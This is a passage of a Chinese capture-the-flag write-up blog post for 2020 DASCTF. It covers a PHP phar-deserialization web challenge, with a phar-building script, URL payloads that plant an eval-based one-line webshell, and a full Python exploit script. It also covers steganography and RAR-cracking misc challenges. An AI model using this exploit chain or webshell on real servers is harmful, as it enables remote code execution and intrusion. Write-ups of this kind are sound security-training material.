+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>注意到关键点有个全局变量，联想到之前的变量覆盖，这里肯定是可以利用的。</p>
+<p>类<code>Template</code>大概意思就是传入的<code>content</code>，利用<code>pattern</code>进行正则匹配，利用全局变量中的值替换匹配到的值，最后输出以<code>suffix</code>后缀的文件。</p>
+<p>摸索一番后确认为神奇的phar反序列化，考点为文件上传和命令执行。</p>
+<p>利用脚本生成phar文件</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span><span class="token punctuation">;</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your html file is in "</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+
+<p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p>
+<p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p>
+<p>首先用<code>php://input</code>伪协议上传phar文件。</p>
+<p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p>
+<p>然后触发phar文件，利用<code>phar://</code>伪协议</p>
+<p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p>
+<img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy">
+
+<p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p>
+<img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy">
+
+<p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p>
+<p>最后附上exp</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token triple-quoted-string string">"""
+@Time ： 2020/12/25 14:24
+@Auth ： gyy
+@Blog：http://err0r.top
+
+"""</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> os
+
+baseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span>
+
+<span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?php
+class Template&#123;
+    public $content;
+    public $pattern;
+    public $suffix;
+    public function __construct()&#123;
+        $this->content = "&#123;&#123;gyycoming&#125;&#125;";
+        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";
+        $this->suffix = ".php";
+    &#125;
+    public function __destruct() &#123;
+        $this->render();
+    &#125;
+    public function render() &#123;
+        while (True) &#123;
+            if(preg_match($this->pattern, $this->content, $matches)!==1)
+                break;
+            global $&#123;$matches[1]&#125;;
+
+            if(isset($&#123;$matches[1]&#125;)) &#123;
+                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);
+            &#125;
+            else&#123;
+                break;
+            &#125;
+        &#125;
+        if(strlen($this->suffix)>5) &#123;
+            echo "error suffix";
+            die();
+        &#125;
+        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;
+        file_put_contents($filename, $this->content);
+        echo "Your html file is in " . $filename;
+    &#125;
+&#125;
+$phar = new Phar('phar.phar');
+$phar -> stopBuffering();
+$phar -> setStub('&lt;?php __HALT_COMPILER();?>');
+$phar -> addFromString('test.txt','test');
+$object = new Template();
+$phar -> setMetadata($object);
+$phar -> stopBuffering();
+?>'''</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>
+    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>
+    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token builtin">str</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>
+    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>
+    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> shellurl
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload
+    <span class="token punctuation">&#125;</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>
+
+    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>
+    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>
+    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>
+    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre>
+
+
+
+<hr>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr>
+<h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p>
+<img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy">
+
+<p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p>
+<img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy">
+
+<p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p>
+<img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy">
+
+<p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p>
+<img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy">
+
+<p>图片很花，不过依稀能看出来东西的</p>
+<img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy">
+
+<p>所以利用Stegsolve，把这张和原图异或一下即可</p>
+<img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy">
+
+<p><code>md5(NianQingRenBuJiangWuDe)</code></p>
+<p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p>
+<p>这里有人说明文攻击也行…没跑过，大概可以吧。</p>
+<p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p>
+<pre class="language-none"><code class="language-none">左正蹬 -&gt; .
+右鞭腿 -&gt; !
+左刺拳 -&gt; ?</code></pre>
+
+<p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p>
+<img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy">
+
+
+
+<hr>
+<h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p>
+<img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy">
+
+<p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p>
+<p>解压后一个图片一个提示</p>
+<pre class="language-none"><code class="language-none">10132430
+
+取最前面500位就行</code></pre>
+
+<p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p>
+<img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy">
+
+<p>分析到这没做了，电脑有问题没装上PIL模块。</p>
+<p>赛后参考<a target="_blank" rel="noopener" href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p>
+<img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy">
+
+<p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+pic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>
+width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>size
+flag <span class="token operator">=</span> <span class="token string">""</span>
+z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
+i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>
+            z <span class="token operator">+=</span> <span class="token number">1</span>
+            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                flag <span class="token operator">+=</span> <span class="token string">'1'</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                flag <span class="token operator">+=</span> <span class="token string">'0'</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">break</span></code></pre>
+
+<p>跑出来<code>0110011001101100011000010110011101011111011010010111001100111010011001100011010100111000001100100110010100111001011000100011001100110001001110010110000101100010011001010011000101100101011001000110011001100100001101110110010001100110001101010011011000110101011001100110010101100011011001100011011001100110001101100110011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>
+<p>去二进制转字符串，得到flag</p>
+<img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy">
+
+
+
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/dasctf2020/" title="2020DASctf-Writeup">https://err0r.top/article/dasctf2020/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/bmzctf2020/" rel="prev" title="2020BMZctf-Writeup"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2020BMZctf-Writeup</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/ssti/" rel="next" title="SSTI模板注入"><span class="post-nav-text">SSTI模板注入</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2023 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Err0r</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.9</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>
